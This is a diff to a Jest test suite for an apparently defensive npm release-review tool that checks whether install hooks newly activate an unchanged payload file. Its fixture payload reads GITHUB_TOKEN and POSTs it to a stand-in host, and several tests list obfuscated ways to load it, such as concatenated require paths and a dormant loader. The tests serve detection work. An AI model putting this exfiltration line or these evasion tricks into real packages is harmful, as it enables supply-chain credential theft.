@@ -285,28 +285,131 @@ describe("changed install reachability", () => {
   const payload =
     "const token = process.env.GITHUB_TOKEN;\nfetch('https://example.invalid/collect', { method: 'POST', body: token });\n";
   const importsPayload = "require('./test/payload.js');\n";
+  const activations = [
+    ["literal require", importsPayload],
+    ["concatenated require path", "require('./test/pay' + 'load.js');\n"],
+    ["concatenated import path", "import('./test/pay' + 'load.js');\n"],
+    ["folded require identifier", "module['re' + 'quire']('./test/payload.js');\n"],
+  ];
   const scripts = { postinstall: "node setup.js" };
 
-  test("an unchanged hook newly importing an unchanged payload retains high release risk", () => {
-    const before = { "setup.js": SETUP, "test/payload.js": payload };
+  test.each(activations)(
+    "an unchanged hook newly activating a payload through %s retains high release risk",
+    (_label, activation) => {
+      const before = { "setup.js": SETUP, "test/payload.js": payload };
+      const staged = { ...before, "setup.js": `${SETUP}${activation}` };
+      const result = review(manifest("1.0.0", scripts), manifest("1.0.1", scripts), before, staged);
+      for (const ruleId of ["code.credential-access", "code.network-access"]) {
+        expect(result.annotated).toContainEqual(
+          expect.objectContaining({
+            ruleId,
+            file: "test/payload.js",
+            diffStatus: "unchanged",
+            releaseDelta: true,
+          }),
+        );
+      }
+      expect(result.risk.releaseRisk).toBe("high");
+    },
+  );
+
+  test.each(activations)(
+    "a payload already install-reachable through %s remains package context",
+    (_label, activation) => {
+      const before = { "setup.js": activation, "test/payload.js": payload };
+      const result = review(manifest("1.0.0", scripts), manifest("1.0.1", scripts), before, before);
+      const payloadFindings = result.annotated.filter(
+        (finding) => finding.file === "test/payload.js",
+      );
+      expect(payloadFindings.length).toBeGreaterThan(0);
+      expect(payloadFindings.every((finding) => !finding.releaseDelta)).toBe(true);
+      expect(result.risk.artifactRisk).toBe("high");
+      expect(result.risk.releaseRisk).toBe("low");
+    },
+  );
+
+  test.each([
+    ["comment", "// require('./test/payload.js');\n"],
+    ["string literal", "const example = \"require('./test/payload.js')\";\n"],
+  ])("a baseline %s cannot establish prior payload execution", (_label, example) => {
+    const before = { "setup.js": `${SETUP}${example}`, "test/payload.js": payload };
     const staged = { ...before, "setup.js": `${SETUP}${importsPayload}` };
     const result = review(manifest("1.0.0", scripts), manifest("1.0.1", scripts), before, staged);
-    for (const ruleId of ["code.credential-access", "code.network-access"]) {
-      expect(result.annotated).toContainEqual(
-        expect.objectContaining({
-          ruleId,
-          file: "test/payload.js",
-          diffStatus: "unchanged",
-          releaseDelta: true,
-        }),
-      );
-    }
+    expect(result.annotated).toContainEqual(
+      expect.objectContaining({
+        ruleId: "code.credential-access",
+        file: "test/payload.js",
+        diffStatus: "unchanged",
+        releaseDelta: true,
+      }),
+    );
     expect(result.risk.releaseRisk).toBe("high");
   });
 
-  test("an already install-reachable unchanged payload remains package context", () => {
+  test("an incidental lifecycle output operand cannot establish prior payload execution", () => {
+    const outputScripts = { postinstall: "node setup.js --out ./test/payload.js" };
+    const before = { "setup.js": SETUP, "test/payload.js": payload };
+    const staged = { ...before, "setup.js": `${SETUP}${importsPayload}` };
+    const result = review(
+      manifest("1.0.0", outputScripts),
+      manifest("1.0.1", outputScripts),
+      before,
+      staged,
+    );
+    expect(result.annotated).toContainEqual(
+      expect.objectContaining({
+        ruleId: "code.credential-access",
+        file: "test/payload.js",
+        diffStatus: "unchanged",
+        releaseDelta: true,
+      }),
+    );
+    expect(result.risk.releaseRisk).toBe("high");
+  });
+
+  test("a previously unused loader function becoming invoked rechecks its unchanged payload", () => {
+    const dormant = "function dormant() { require('./test/payload.js'); }\n";
+    const before = { "setup.js": dormant, "test/payload.js": payload };
+    const staged = { ...before, "setup.js": `${dormant}dormant();\n` };
+    const result = review(manifest("1.0.0", scripts), manifest("1.0.1", scripts), before, staged);
+    expect(result.annotated).toContainEqual(
+      expect.objectContaining({
+        ruleId: "code.credential-access",
+        file: "test/payload.js",
+        diffStatus: "unchanged",
+        releaseDelta: true,
+      }),
+    );
+    expect(result.risk.releaseRisk).toBe("high");
+  });
+
+  test("removing an ASI-sensitive newline activates an unchanged payload", () => {
+    const before = {
+      "setup.js": "function run(){ return\n require('./test/payload.js'); } run();\n",
+      "test/payload.js": payload,
+    };
+    const staged = {
+      ...before,
+      "setup.js": "function run(){ return require('./test/payload.js'); } run();\n",
+    };
+    const result = review(manifest("1.0.0", scripts), manifest("1.0.1", scripts), before, staged);
+    expect(result.annotated).toContainEqual(
+      expect.objectContaining({
+        ruleId: "code.credential-access",
+        file: "test/payload.js",
+        diffStatus: "unchanged",
+        releaseDelta: true,
+      }),
+    );
+    expect(result.risk.releaseRisk).toBe("high");
+  });
+
+  test.each([
+    ["comment-only", "require('./test/payload.js'); /* install documentation */\n"],
+    ["spacing-only", "require ( './test/payload.js' ) ;\n"],
+  ])("a %s install-source edit keeps an existing dangerous payload contextual", (_label, setup) => {
     const before = { "setup.js": importsPayload, "test/payload.js": payload };
-    const staged = { ...before, "setup.js": `${importsPayload}${SETUP}` };
+    const staged = { ...before, "setup.js": setup };
     const result = review(manifest("1.0.0", scripts), manifest("1.0.1", scripts), before, staged);
     const payloadFindings = result.annotated.filter(
       (finding) => finding.file === "test/payload.js",
@@ -316,6 +419,44 @@ describe("changed install reachability", () => {
     expect(result.risk.artifactRisk).toBe("high");
     expect(result.risk.releaseRisk).toBe("low");
   });
+
+  test("new loading of an unchanged inert native artifact remains high release risk", () => {
+    const before = { "setup.js": SETUP, "payload.node": "INERT_NATIVE_ARTIFACT_FIXTURE" };
+    const staged = { ...before, "setup.js": "require('./payload.node');\n" };
+    const result = review(manifest("1.0.0", scripts), manifest("1.0.1", scripts), before, staged);
+    expect(result.annotated).toContainEqual(
+      expect.objectContaining({
+        ruleId: "file.native-artifact",
+        file: "payload.node",
+        severity: "high",
+        diffStatus: "unchanged",
+        releaseDelta: true,
+      }),
+    );
+    expect(result.risk.releaseRisk).toBe("high");
+  });
+
+  test.each([
+    ["comment", "// require('./test/payload.js');\n", scripts],
+    ["string literal", "const example = \"require('./test/payload.js')\";\n", scripts],
+    ["output operand", SETUP, { postinstall: "node setup.js --out ./test/payload.js" }],
+  ])(
+    "a benign %s mention alone does not newly activate payload findings",
+    (_label, example, hooks) => {
+      const before = { "setup.js": SETUP, "test/payload.js": payload };
+      const staged = {
+        ...before,
+        "setup.js": `${example}console.log('ordinary setup revision');\n`,
+      };
+      const result = review(manifest("1.0.0", hooks), manifest("1.0.1", hooks), before, staged);
+      const payloadFindings = result.annotated.filter(
+        (finding) => finding.file === "test/payload.js",
+      );
+      expect(payloadFindings.length).toBeGreaterThan(0);
+      expect(payloadFindings.every((finding) => !finding.releaseDelta)).toBe(true);
+      expect(result.risk.releaseRisk).toBe("low");
+    },
+  );
 
   test("new install reachability attributes an unchanged registry-publication payload", () => {
     const publish =
